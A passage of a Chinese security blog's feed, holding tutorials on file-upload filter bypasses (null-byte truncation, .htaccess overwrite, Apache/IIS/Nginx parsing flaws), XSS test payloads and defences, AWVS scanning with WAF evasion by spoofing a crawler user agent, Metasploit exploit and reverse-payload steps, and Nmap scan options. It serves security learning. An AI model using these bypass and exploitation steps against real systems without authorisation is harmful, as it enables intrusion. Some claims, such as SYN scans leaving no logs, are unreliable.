id="6-解析调用-漏洞绕过"><a href="#6-解析调用-漏洞绕过" class="headerlink" title="6.解析调用/漏洞绕过"></a>6.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p><h3 id="服务器端白名单检测绕过"><a href="#服务器端白名单检测绕过" class="headerlink" title="服务器端白名单检测绕过"></a>服务器端白名单检测绕过</h3><p>白名单相对来说比黑名单安全一些，但也不见得就绝对安全了</p><h5 id="1-0x00-截断绕过"><a href="#1-0x00-截断绕过" class="headerlink" title="1.0x00 截断绕过"></a>1.0x00 截断绕过</h5><p>用像 test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑 漏洞进行攻击，目前我只遇到过 asp 的程序有这种漏洞</p><h5 id="2-解析调用-漏洞绕过"><a href="#2-解析调用-漏洞绕过" class="headerlink" title="2.解析调用/漏洞绕过"></a>2.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞</p><h5 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h5><p>无论是黑名单还是白名单</p><p>再直接点就是直接攻击.htaccess 文件</p><p>在 PHP manual 中提到了下面一段话</p><p>move_uploaded_file section, there is a warning which states  ‘If the destination file already exists, it will be overwritten.’  如果 PHP 安全没配置好</p><p>就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的 这样就能任意定义解析名单了</p><h3 id="网络渗透本质：代码注入-代码解析-执行"><a href="#网络渗透本质：代码注入-代码解析-执行" class="headerlink" title="网络渗透本质：代码注入+代码解析/执行"></a>网络渗透本质：代码注入+代码解析/执行</h3><h4 id="主要是两类情况"><a href="#主要是两类情况" class="headerlink" title="主要是两类情况"></a>主要是两类情况</h4><h5 id="1-直接解析-执行攻击"><a href="#1-直接解析-执行攻击" class="headerlink" title="1.直接解析/执行攻击"></a>1.直接解析/执行攻击</h5><p>像缓冲区溢出和 sql 注入攻击，脚本代码注入就是很明显的属于这里攻击 直接将代码注入到一个解析/执行环境里，直接就能让代码得到执行所以危害性也来得最大，效果最明显</p><p>shellcode 注入程序后，直接劫持 EIP，进行该系统环境权限做任何操作</p><p>sql 命令注入数据库后，直接就能执行该数据库账号权限下的任何操作</p><h5 id="2-配合解析-执行攻击"><a href="#2-配合解析-执行攻击" class="headerlink" title="2.配合解析/执行攻击"></a>2.配合解析/执行攻击</h5><p>算是一种组合攻击，在这类情况下</p><p>往往不像第一种情况能拥有直接的解析/执行环境 比较明显的就是我们的上传攻击</p><p>我们需要先上传数据(注入代码)到服务端上去</p><p>然后想办法去调用解析/执行环境(比如 Web 应用程序解析漏洞)  来解析/执行已经注入到了服务端的代码</p><h4 id="三种解析方式"><a href="#三种解析方式" class="headerlink" title="三种解析方式"></a>三种解析方式</h4><h5 id="直接解析"><a href="#直接解析" class="headerlink" title="-直接解析"></a>-直接解析</h5><p>能以 asp,php 之类的扩展名存储在服务器上</p><h5 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="-本地文件包含解析"></a>-本地文件包含解析</h5><p>主要是 php 的本地文件包含 (远程文件包含不属于上传攻击绕过范畴)</p><h5 id="htaccess-解析"><a href="#htaccess-解析" class="headerlink" title="-.htaccess 解析"></a>-.htaccess 解析</h5><p>.htaccess 文件 用户自己定义如何去调用解析器解析文件就可以了</p><h3 id="Web应用程序解析漏洞"><a href="#Web应用程序解析漏洞" class="headerlink" title="Web应用程序解析漏洞"></a>Web应用程序解析漏洞</h3><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>111.php.ddd</p><p>解析 - test.php.任意不属于黑名单且也不属于 Apache 解析白名单的名称</p><p>描述 - 一个文件名为 x1.x2.x3 的文件，Apache 会从 x3 的位置往 x1 的位置开始尝试解析 如果 x3 不属于 Apache 能解析的扩展名，那么 Apache 会尝试去解析 x2 的位置，  从后往前解析，直到遇到一个能解析的扩展名为止</p><h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h4><p> 解析 - test.asp/任意文件名 | test.asp;任意文件名 | 任意文件名/任意文件名.php</p><p> IIS6.0 在解析 asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，  那么这个目录下所有的文件都会按照 asp 去解析，另一个是只要文件名中含有”.asp;”  会优先按 asp 来解析</p><p> IIS7.0/7.5 是对 php 解析时有一个类似于 Nginx 的解析漏洞，对任意文件名只要在 URL后面追加上字符串”/任意文件名.php”就会按照 php 的方式去解析</p><h4 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h4><p>解析 - 任意文件名/任意文件名.php | 任意文件名%00.php</p><p>描述 - 目前 Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php  的解析漏洞，比如原本文件名是 test.jpg，可以添加为 test.jpg/x.php 进行解析攻击。 还有一种是对低版本的 Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p><img src="\images\pasted-93.png" alt="upload successful"></p><h3 id="应用层上传漏洞攻击思路"><a href="#应用层上传漏洞攻击思路" class="headerlink" title="应用层上传漏洞攻击思路"></a>应用层上传漏洞攻击思路</h3><p><img src="\images\pasted-92.png" alt="upload successful"></p><h3 id="一个不常见的绕过方式"><a href="#一个不常见的绕过方式" class="headerlink" title="一个不常见的绕过方式"></a>一个不常见的绕过方式</h3><p>文件上传绕过   上传一个php文件，用burp抓包   头部的Content-Type改成Multipart/form-data大小写绕过   请求内容里的Content-Type改成image，文件名改成php5就绕过了</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <link href="http://yoursite.com/2018/08/14/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/XSS跨站脚本漏洞/</id>
    <published>2018-08-14T09:19:05.000Z</published>
    <updated>2018-08-19T11:48:36.982Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS又叫CSS  (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><p>第一种：反射型XSS 简单的把用户数据反射给浏览器，需要用户点击</p><p>第二种：存储型XSS 把用户输入的数据存储在服务器中</p><p>第三种：DOM Based XSS 通过修改DOM节点的反射型xss</p><h1 id="检测漏洞存在"><a href="#检测漏洞存在" class="headerlink" title="检测漏洞存在"></a>检测漏洞存在</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img  src= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;img   dynsrc= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  style= &quot;background-image:url(  javascript:alert(&apos;1&apos;) )&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;font style=&quot;TEST:expression(alert(&apos;1&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h1><p>存储式XSS构成：</p><p><img src="\images\pasted-86.png" alt="upload successful"></p><p>反射式XSS构成：</p><p><img src="\images\pasted-87.png" alt="upload successful"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.对html中不可信字符串进行html转义</p><p>2.对html属性中不可信的字符串进行HTML转义</p><p>3.对javascript字符串中不可信的html先进行html转义，再JavaScript转义</p><p>4.使用白名单，使用UTF-8为默认的字符的字符编码</p><p>5.设置HttpOnly和htmlspecialchars</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全基础</title>
    <link href="http://yoursite.com/2018/08/14/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2018/08/14/Web安全基础/</id>
    <published>2018-08-14T07:06:05.000Z</published>
    <updated>2018-08-14T12:58:55.639Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-78.png" alt="upload successful"></p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p><img src="\images\pasted-79.png" alt="upload successful"></p><h1 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h1><p><img src="\images\pasted-80.png" alt="upload successful"></p><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p><img src="\images\pasted-81.png" alt="upload successful"></p><p>### </p><h1 id="请求伪造漏洞"><a href="#请求伪造漏洞" class="headerlink" title="请求伪造漏洞"></a>请求伪造漏洞</h1><p><img src="\images\pasted-82.png" alt="upload successful"></p><h1 id="文件处理漏洞"><a href="#文件处理漏洞" class="headerlink" title="文件处理漏洞"></a>文件处理漏洞</h1><p><img src="\images\pasted-83.png" alt="upload successful"></p><h1 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h1><p><img src="\images\pasted-84.png" alt="upload successful"></p><h1 id="会话管理漏洞"><a href="#会话管理漏洞" class="headerlink" title="会话管理漏洞"></a>会话管理漏洞</h1><p><img src="\images\pasted-85.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>AWVS使用指北</title>
    <link href="http://yoursite.com/2018/08/14/AWVS%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/AWVS指南/</id>
    <published>2018-08-14T05:54:05.000Z</published>
    <updated>2018-08-14T06:58:01.327Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-58.png" alt="upload successful"></p><h1 id="AWVS介绍"><a href="#AWVS介绍" class="headerlink" title="AWVS介绍"></a>AWVS介绍</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的 Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流 行安全漏洞。 它包含有收费和免费两种版本，AWVS官方网站是： <a href="http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：" target="_blank" rel="noopener">http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：</a> <a href="https://www.acunetix.com/vulnerability-scanner/download/，" target="_blank" rel="noopener">https://www.acunetix.com/vulnerability-scanner/download/，</a> 官方免费下载的是试用14天的版本。    吾爱破解网站上有完整的安装破解过程</p><h1 id="AWVS优点"><a href="#AWVS优点" class="headerlink" title="AWVS优点"></a>AWVS优点</h1><p>自动的客户端脚本分析器，允许对 Ajax 和 Web 2.0 应用程序进行安全性测 试。</p><p>业内最先进且深入的 SQL 注入和跨站脚本测试 </p><p>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer </p><p>可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域</p><p> 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制 </p><p>丰富的报告功能，包括 VISA PCI 依从性报告 </p><p>高速的多线程扫描器轻松检索成千上万个页面 i)、智能爬行程序检测 web 服务器类型和应用程序语言</p><p>Acunetix 检索并分析网站，包括 flash 内容、 SOAP 和 AJAX </p><p>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 l)、可导出网站漏洞文件    </p><h1 id="AWVS菜单栏"><a href="#AWVS菜单栏" class="headerlink" title="AWVS菜单栏"></a>AWVS菜单栏</h1><p><img src="\images\pasted-59.png" alt="upload successful"></p><h1 id="AWVS工具栏"><a href="#AWVS工具栏" class="headerlink" title="AWVS工具栏"></a>AWVS工具栏</h1><p><img src="\images\pasted-60.png" alt="upload successful"></p><p>从左到右分别是：</p><p>新建扫描——网站扫描——网站爬行——目标查找——目标探测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅探——HTTP Fuzzer——认证测试——结果对比——WSDL扫描——WSDL编辑测试——程序设置——扫描设置——侧重扫描设置——计划任务——报告</p><p>对于AWVS最常用的应该就是站点扫描了</p><h1 id="AWVS-新建扫描"><a href="#AWVS-新建扫描" class="headerlink" title="AWVS 新建扫描"></a>AWVS 新建扫描</h1><p>点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要<br>设定下面选项:<br>1). Scan type<br>2). Options<br>3). Target<br>4). Login<br>5). Finsh</p><h3 id="AWVS-新建扫描——Scan-type"><a href="#AWVS-新建扫描——Scan-type" class="headerlink" title="AWVS 新建扫描——Scan type"></a>AWVS 新建扫描——Scan type</h3><p><img src="\images\pasted-75.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Options"><a href="#AWVS-新建扫描——Options" class="headerlink" title="AWVS 新建扫描——Options"></a>AWVS 新建扫描——Options</h3><p><img src="\images\pasted-76.png" alt="upload successful"></p><h4 id="Options——Scanning-profile"><a href="#Options——Scanning-profile" class="headerlink" title="Options——Scanning profile"></a>Options——Scanning profile</h4><p>设置侧重扫描的类型，包含16种侧重检测类型</p><p><img src="\images\pasted-63.png" alt="upload successful"></p><h5 id="Scanning-Profiles-scripts"><a href="#Scanning-Profiles-scripts" class="headerlink" title="Scanning Profiles scripts"></a>Scanning Profiles scripts</h5><p><img src="\images\pasted-64.png" alt="upload successful"></p><h3 id="Options——Scan-Setting"><a href="#Options——Scan-Setting" class="headerlink" title="Options——Scan Setting"></a>Options——Scan Setting</h3><p><img src="\images\pasted-74.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Advanced"><a href="#AWVS-新建扫描——Advanced" class="headerlink" title="AWVS 新建扫描——Advanced"></a>AWVS 新建扫描——Advanced</h3><p><img src="\images\pasted-67.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Target"><a href="#AWVS-新建扫描——Target" class="headerlink" title="AWVS 新建扫描——Target"></a>AWVS 新建扫描——Target</h3><p><img src="\images\pasted-68.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Login"><a href="#AWVS-新建扫描——Login" class="headerlink" title="AWVS 新建扫描——Login"></a>AWVS 新建扫描——Login</h3><p><img src="\images\pasted-69.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Finish"><a href="#AWVS-新建扫描——Finish" class="headerlink" title="AWVS 新建扫描——Finish"></a>AWVS 新建扫描——Finish</h3><p><img src="\images\pasted-70.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——结果（一）"><a href="#AWVS-新建扫描——结果（一）" class="headerlink" title="AWVS 新建扫描——结果（一）"></a>AWVS 新建扫描——结果（一）</h3><p><img src="\images\pasted-71.png" alt="upload successful"></p><p><img src="\images\pasted-77.png" alt="upload successful"><br>扫描的结果能看到发现漏洞所用的payload，对应的HTTP头信息、HTML、可发送到HTTP Editor中等</p><h3 id="AWVS-新建扫描——结果（二）"><a href="#AWVS-新建扫描——结果（二）" class="headerlink" title="AWVS 新建扫描——结果（二）"></a>AWVS 新建扫描——结果（二）</h3><p><img src="\images\pasted-72.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——导出"><a href="#AWVS-新建扫描——导出" class="headerlink" title="AWVS 新建扫描——导出"></a>AWVS 新建扫描——导出</h3><p><img src="\images\pasted-73.png" alt="upload successful"></p><h1 id="AWVS扫描小技巧"><a href="#AWVS扫描小技巧" class="headerlink" title="AWVS扫描小技巧"></a>AWVS扫描小技巧</h1><h3 id="1-文件头加"><a href="#1-文件头加" class="headerlink" title="1.文件头加"></a>1.文件头加</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p>可以绕过狗，waf等<br>另外如果很容易把对方扫死的话，可以在第一项limit number…..，这里是最大的并发连接数默认是10，可以改低为2-5， 某些WAF对访问请求时间太快会进行拦截，可以进行延迟发包，在Delay between 默认是0，改为1-5</p><h3 id="2-设置cookie"><a href="#2-设置cookie" class="headerlink" title="2.设置cookie"></a>2.设置cookie</h3><p>表单验证用户某些页面，例如扫描后台、扫描用户登录后可访问的页面时候，需要登录用户密码验证再进行扫描，可以设置cookie 来解决</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit使用指南</title>
    <link href="http://yoursite.com/2018/08/14/Metasploit%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/Metasploit使用指南/</id>
    <published>2018-08-14T02:29:05.000Z</published>
    <updated>2018-08-14T03:12:34.872Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-57.png" alt="upload successful"></p><h1 id="什么是Metasploit"><a href="#什么是Metasploit" class="headerlink" title="什么是Metasploit"></a>什么是Metasploit</h1><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。 </p><h1 id="metasploit的启动"><a href="#metasploit的启动" class="headerlink" title="metasploit的启动"></a>metasploit的启动</h1><h3 id="安装metasploit"><a href="#安装metasploit" class="headerlink" title="安装metasploit"></a>安装metasploit</h3><p><code>apt-get install metasploit-framework</code></p><h3 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h3><p><code>msfconsole</code></p><h1 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h1><h3 id="查找相关模块"><a href="#查找相关模块" class="headerlink" title="查找相关模块"></a>查找相关模块</h3><p>我们可以通过search命令查找相关的扫描脚本。</p><p>命令格式：<code>search Name</code>      如<code>search samba</code></p><h3 id="使用use调度模块"><a href="#使用use调度模块" class="headerlink" title="使用use调度模块"></a>使用use调度模块</h3><p>找到了我们需要攻击的目标模块，我们就使用它，</p><p>通过命令：<code>use ExploitName</code>    如<code>use exploit/multi/samba/usermap_script。</code></p><h3 id="使用info查看模块信息"><a href="#使用info查看模块信息" class="headerlink" title="使用info查看模块信息"></a>使用info查看模块信息</h3><p>metasploit使用info查看模块信息 </p><h3 id="选择payload作为攻击"><a href="#选择payload作为攻击" class="headerlink" title="选择payload作为攻击"></a>选择payload作为攻击</h3><p>选择payload，首先我们要看能使用哪些参数，通过命令：<code>show payloads</code><br>在选择攻击载荷的时候，建议选用和meterpreter和reverse相关的载荷，</p><p>通过使用命令：<code>set payload PayloadName</code>如 set payload cmd/unix/reverse</p><h3 id="metasploit设置攻击参数"><a href="#metasploit设置攻击参数" class="headerlink" title="metasploit设置攻击参数"></a>metasploit设置攻击参数</h3><p>首先通过<code>show options</code>或者options，查看需要填写的参数</p><p>用set命令填充参数</p><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p><code>run</code></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Nmap使用指北</title>
    <link href="http://yoursite.com/2018/08/13/Nmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/13/Nmap使用指北/</id>
    <published>2018-08-13T14:26:05.000Z</published>
    <updated>2018-08-13T15:19:24.153Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>Nmap是一个非常强大的工具，它具有覆盖渗透测试的第一方面的能力，其中包括信息的收集和统计它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：</p><p>检测活在网络上的主机（主机发现）<br>检测主机上开放的端口（端口发现或枚举）<br>检测到相应的端口（服务发现）的软件和版本<br>检测操作系统，硬件地址，以及软件版本<br>检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="参数使用"><a href="#参数使用" class="headerlink" title="参数使用"></a>参数使用</h2><h4 id="扫描单一的一个主机："><a href="#扫描单一的一个主机：" class="headerlink" title="扫描单一的一个主机："></a>扫描单一的一个主机：</h4><p><code>nmap cnblogs.com</code></p><p><code>nmap 192.168.1.2</code></p><h4 id="扫描整个子网"><a href="#扫描整个子网" class="headerlink" title="扫描整个子网:"></a>扫描整个子网:</h4><p><code>nmap 192.168.1.1/24</code></p><h4 id="扫描多个目标："><a href="#扫描多个目标：" class="headerlink" title="扫描多个目标："></a>扫描多个目标：</h4><p><code>nmap 192.168.1.2 192.168.1.5</code></p><h4 id="扫描一个范围内的目标："><a href="#扫描一个范围内的目标：" class="headerlink" title="扫描一个范围内的目标："></a>扫描一个范围内的目标：</h4><p><code>nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</code></p><h4 id="如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下-扫描这个txt内的所有主机："><a href="#如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下-扫描这个txt内的所有主机：" class="headerlink" title="如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机："></a>如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机：</h4><p><code>nmap -iL target.txt</code></p><h4 id="扫描的所有主机的列表"><a href="#扫描的所有主机的列表" class="headerlink" title="扫描的所有主机的列表:"></a>扫描的所有主机的列表:</h4><p><code>nmap -sL 192.168.1.1/24</code></p><h4 id="扫描除过某一个ip外的所有子网主机："><a href="#扫描除过某一个ip外的所有子网主机：" class="headerlink" title="扫描除过某一个ip外的所有子网主机："></a>扫描除过某一个ip外的所有子网主机：</h4><p><code>nmap 192.168.1.1/24 -exclude 192.168.1.1</code></p><h4 id="扫描除过某一个文件中的ip外的子网主机命令："><a href="#扫描除过某一个文件中的ip外的子网主机命令：" class="headerlink" title="扫描除过某一个文件中的ip外的子网主机命令："></a>扫描除过某一个文件中的ip外的子网主机命令：</h4><p><code>nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)</code></p><h4 id="扫描特定主机上的80-21-23端口："><a href="#扫描特定主机上的80-21-23端口：" class="headerlink" title="扫描特定主机上的80,21,23端口："></a>扫描特定主机上的80,21,23端口：</h4><p><code>nmap -p80,21,23 192.168.1.1</code></p><h2 id="深入扫描"><a href="#深入扫描" class="headerlink" title="深入扫描"></a>深入扫描</h2><h4 id="半开放扫描-，不会在目标主机上产生任何日志记录"><a href="#半开放扫描-，不会在目标主机上产生任何日志记录" class="headerlink" title="半开放扫描 ，不会在目标主机上产生任何日志记录"></a>半开放扫描 ，不会在目标主机上产生任何日志记录</h4><p><code>nmap -sS 192.168.1.1</code></p><p>Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势. </p><h4 id="找出TCP和UDP端口"><a href="#找出TCP和UDP端口" class="headerlink" title="找出TCP和UDP端口"></a>找出TCP和UDP端口</h4><p><code>nmap -sT 192.168.1.1</code></p><p>TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口. </p><h4 id="找目标主机打开的UDP端口，不需要发送任何的SYN包"><a href="#找目标主机打开的UDP端口，不需要发送任何的SYN包" class="headerlink" title="找目标主机打开的UDP端口，不需要发送任何的SYN包"></a>找目标主机打开的UDP端口，不需要发送任何的SYN包</h4><p><code>nmap -sU 192.168.1.1</code></p><p>它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的. </p><h4 id="为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包"><a href="#为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包" class="headerlink" title="为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包"></a>为规避防火墙，发送一个设置了FIN标志且不需要完成TCP的握手的数据包</h4><p><code>nmap -sF 192.168.1.8</code></p><p>FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一) </p><h4 id="ping扫描，只用于找出主机是否是存在在网络中"><a href="#ping扫描，只用于找出主机是否是存在在网络中" class="headerlink" title="ping扫描，只用于找出主机是否是存在在网络中"></a>ping扫描，只用于找出主机是否是存在在网络中</h4><p><code>nmap -sP 192.168.1.1</code></p><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p><code>nmap -sV 192.168.1.1</code> </p><p>不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口. </p><h4 id="匿名扫描技术"><a href="#匿名扫描技术" class="headerlink" title="匿名扫描技术"></a>匿名扫描技术</h4><p><code>nmap -sL 192.168.1.6 192.168.1.1</code></p><p>不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包. Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口</p><h4 id="OS检测（O）"><a href="#OS检测（O）" class="headerlink" title="OS检测（O）"></a>OS检测（O）</h4><p><code>nmap -O  192.168.199.111</code>  </p><p>能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照</p><h4 id="不ping远程主机"><a href="#不ping远程主机" class="headerlink" title="不ping远程主机"></a>不ping远程主机</h4><p><code>nmap -O -PN 192.168.1.1/24</code></p><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会挡掉ping请求.-PN命令告诉Nmap不用ping远程主机。 使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现 </p><h4 id="猜测功能"><a href="#猜测功能" class="headerlink" title="猜测功能"></a>猜测功能</h4><p><code>nmap -O –osscan-guess 192.168.1.1</code></p><p>通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项, –osscan-guess 猜测认为最接近目标的匹配操作系统类型</p><h1 id="官网文档："><a href="#官网文档：" class="headerlink" title="官网文档："></a>官网文档：</h1><p>Nmap 7.60SVN（<a href="https://nmap.org）" target="_blank" rel="noopener">https://nmap.org）</a></p><p>用法：nmap [扫描类型] [选项] {目标规范}</p><h4 id="目标规格："><a href="#目标规格：" class="headerlink" title="目标规格："></a>目标规格：</h4><p> 可以传递主机名，IP地址，网络等。</p><p> 例如：scanme.nmap.org，microsoft.com / 24,192.168.0.1; 10.0.0-255.1-254</p><p> -iL <inputfilename>：从主机/网络列表输入</inputfilename></p><p> -iR <num hosts="">：选择随机目标</num></p><p> –exclude <host1 [，host2]="" [，host3]，...="">：排除主机/网络</host1></p><p> –excludefile &lt;exclude_file&gt;：从文件中排除列表</p><h4 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h4><p>  -sL：列表扫描 - 只列出要扫描的目标</p><p>  -sn：Ping扫描 - 禁用端口扫描</p><p>  -Pn：将所有主机视为在线 - 